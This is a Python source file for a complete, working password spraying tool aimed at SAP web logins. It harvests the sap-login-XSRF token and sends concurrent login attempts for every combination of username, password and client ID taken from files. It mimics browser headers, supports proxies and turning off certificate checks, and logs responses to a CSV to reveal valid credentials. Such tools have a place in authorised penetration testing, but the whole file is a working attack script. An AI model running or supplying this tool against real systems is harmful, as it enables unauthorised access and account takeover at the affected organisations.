#!/usr/bin/env python3
"""
SAP password spraying tool
"""
import argparse
import asyncio
import aiohttp
import pandas as pd
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import html


async def login(
    username, password, client_id, token_url, login_url, referer_url, ssl, proxy
):
    """
    Perform a login attempt using the provided credentials and anti-CSRF token.
    """
    try:
        async with aiohttp.ClientSession() as session:
            # Perform the initial GET request
            o = urlparse(token_url)
            headers = {
                "Host": o.hostname,
                "Cookie": f"sap-usercontext=sap-client={client_id}",
                "Sec-Ch-Ua": "",
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": "",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": referer_url,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close",
            }

            token = None
            async with session.get(
                token_url, headers=headers, ssl=ssl, proxy=proxy
            ) as response:
                # Extract the anti-CSRF token from the response
                soup = BeautifulSoup(await response.text(), "html.parser")
                token = soup.find("input", {"name": "sap-login-XSRF"})["value"]

            # Decode the anti-CSRF token from HTML encoding
            token = html.unescape(token)

            # Perform the login attempt
            data = {
                "FOCUS_ID": "sap-user",
                "sap-system-login-oninputprocessing": "onLogin",
                "sap-urlscheme": "",
                "sap-system-login": "onLogin",
                "sap-system-login-basic_auth": "",
                "sap-accessibility": "",
                "sap-login-XSRF": token,
                "sap-system-login-cookie_disabled": "",
                "sysid": "PRB",
                "sap-client": f"{client_id}",
                "sap-user": username,
                "sap-password": password,
                "sap-language": "EN",
                "sap-language-dropdown": "English",
                "SAPEVENTQUEUE": "Form_Submit~E002Id~E004SL__FORM~E003~E002ClientAction~E004submit~E005ActionUrl~E004~E005ResponseData~E004full~E005PrepareScript~E004~E003~E002~E003",
            }

            async with session.post(
                login_url,
                headers=headers,
                data=data,
                ssl=ssl,
                proxy=proxy,
                allow_redirects=False,
            ) as response:
                # Extract the required information from the response
                # response_code = response.status
                # content_length = response.content_length

                # Process the login response and extract relevant information
                response_code = response.status
                content_length = response.headers.get("Content-Length", "")
                # Extract other desired information from the response
                result = {
                    "Response Code": response_code,
                    "Content Length": content_length,
                    "Username": username,
                    "Password": password,
                    "Client ID": client_id,
                    # Add other desired information
                }
                return result
    except Exception as e:
        print(f"An error occurred for username {username} and password {password}: {e}")
        return {
            "Response Code": 0,
            "Content Length": 0,
            "Username": username,
            "Password": password,
            "Client ID": client_id,
        }


async def process_login_attempts(
    usernames,
    passwords,
    client_ids,
    token_url,
    login_url,
    referer_url,
    max_concurrency,
    ssl,
    proxy,
):
    """
    Process login attempts for the provided usernames, passwords, and client
    IDs.
    """
    semaphore = asyncio.Semaphore(max_concurrency)
    tasks = []

    async def do_login(
        username, password, client_id, token_url, login_url, referer_url, ssl, proxy
    ):
        async with semaphore:
            result = await login(
                username,
                password,
                client_id,
                token_url,
                login_url,
                referer_url,
                ssl,
                proxy,
            )
            return result

    for client_id in client_ids:
        for password in passwords:
            for username in usernames:
                task = asyncio.create_task(
                    do_login(
                        username,
                        password,
                        client_id,
                        token_url,
                        login_url,
                        referer_url,
                        ssl,
                        proxy,
                    )
                )
                tasks.append(task)

    results = await asyncio.gather(*tasks)
    return results


def main():
    # Parse the command-line arguments
    parser = argparse.ArgumentParser(description="SAP password spraying tool")
    parser.add_argument("usernames_file", help="File containing usernames")
    parser.add_argument("passwords_file", help="File containing passwords")
    parser.add_argument("client_ids_file", help="File containing client IDs")
    parser.add_argument("token_url", help="URL to obtain the anti-CSRF token")
    parser.add_argument(
        "--login-url", help="URL for the login attempt (default: same as token URL)"
    )
    parser.add_argument(
        "--referer-url",
        help="Referer URL for the login attempt (default: same as token URL)",
    )
    parser.add_argument(
        "--max-concurrency",
        type=int,
        default=10,
        help="Maximum number of concurrent tasks (default: 10)",
    )
    parser.add_argument(
        "--http-proxy",
        help="HTTP proxy to use for requests (e.g., http://proxy.example.com:8080)",
    )
    parser.add_argument(
        "--disable-ssl-verification",
        action="store_true",
        help="Disable SSL certificate verification",
    )
    args = parser.parse_args()
    print(f"{args}")

    # Read the usernames, passwords, and client IDs from files
    with open(args.usernames_file, "r") as usernames_file:
        usernames = usernames_file.read().splitlines()

    with open(args.passwords_file, "r") as passwords_file:
        passwords = passwords_file.read().splitlines()

    with open(args.client_ids_file, "r") as client_ids_file:
        client_ids = client_ids_file.read().splitlines()

    # Configure URLs for login attempt and referer
    token_url = args.token_url
    login_url = args.login_url or token_url
    referer_url = args.referer_url or token_url

    # Configure SSL verification
    ssl_verify = not args.disable_ssl_verification

    # Configure the HTTP proxy
    proxy = args.http_proxy or ""

    # Create the event loop
    loop = asyncio.get_event_loop()

    # Perform login attempts
    results = loop.run_until_complete(
        process_login_attempts(
            usernames,
            passwords,
            client_ids,
            token_url,
            login_url,
            referer_url,
            args.max_concurrency,
            ssl_verify,
            proxy,
        )
    )

    # Cleanup event loop
    loop.close()

    # Save results to a CSV file using pandas
    df = pd.DataFrame(
        results,
        columns=[
            "Response Code",
            "Content Length",
            "Username",
            "Password",
            "Client ID",
        ],
    )
    df.to_csv("login_results.csv", index=False)

    print("Login attempts completed. Results saved in login_results.csv")


if __name__ == "__main__":
    main()
